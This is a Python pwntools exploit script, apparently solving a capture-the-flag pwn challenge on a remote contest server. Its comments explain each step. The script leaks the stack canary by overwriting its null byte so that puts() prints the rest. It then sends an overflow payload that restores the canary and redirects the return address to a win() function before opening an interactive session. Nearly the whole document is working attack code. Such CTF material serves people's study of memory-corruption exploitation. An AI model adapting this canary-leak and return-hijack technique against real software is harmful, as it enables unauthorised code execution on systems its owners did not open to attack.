from pwn import *

# From checksec:
# Stack:      Canary found  =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        No PIE (0x400000)  =>  addresses are static and can be used directly in the exploit (e.g., win() function address)

conn = remote("offsec.m0lecon.it", 13522)
OFFSET_TO_CANARY = 72   # 64 bytes for the buffer + 8 bytes for alignment
OFFSET_TO_FIRST_BYTE_OF_CANARY = OFFSET_TO_CANARY + 1   # 72 bytes to reach the canary + 1 byte to overwrite the null byte of the canary:
                                                        # in this way, the puts() function call will NOT stop at the null byte and will leak the entire canary value
win_addr = 0x401236

conn.recvuntil(b"Say 'bye' when you're done chatting.\n")
conn.send(b"A" * OFFSET_TO_FIRST_BYTE_OF_CANARY)    # send enough bytes to reach and overwrite the first byte of the canary

conn.recvline()               # consumes the "\n" appended by the puts() function
response = conn.recvline()    # read the line containing the canary leak (i.e. the missing 7 bytes we need)

print("FULL RESPONSE:", response)
print("INTERESTING PART OF RESPONSE: ", response[OFFSET_TO_FIRST_BYTE_OF_CANARY : OFFSET_TO_FIRST_BYTE_OF_CANARY + 7])

canary = u64(b"\x00" + response[OFFSET_TO_FIRST_BYTE_OF_CANARY : OFFSET_TO_FIRST_BYTE_OF_CANARY + 7])  # u64 serves to convert the 8 bytes into a single 64-bit value representing the canary
                                                                                                       # for example: u64(b"\x00\x74\x62\xe5\x77\xde\xaf\xbc")  ==>  0xbcafde77e5627400
log.success(f"Canary: {hex(canary)}")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * 8,       # 8 bytes for the saved RBP
    p64(win_addr)
)

conn.send(payload)

conn.send(b"bye")   # send "bye" to the server to break the infinite for loop and jump to the win() function

conn.interactive()
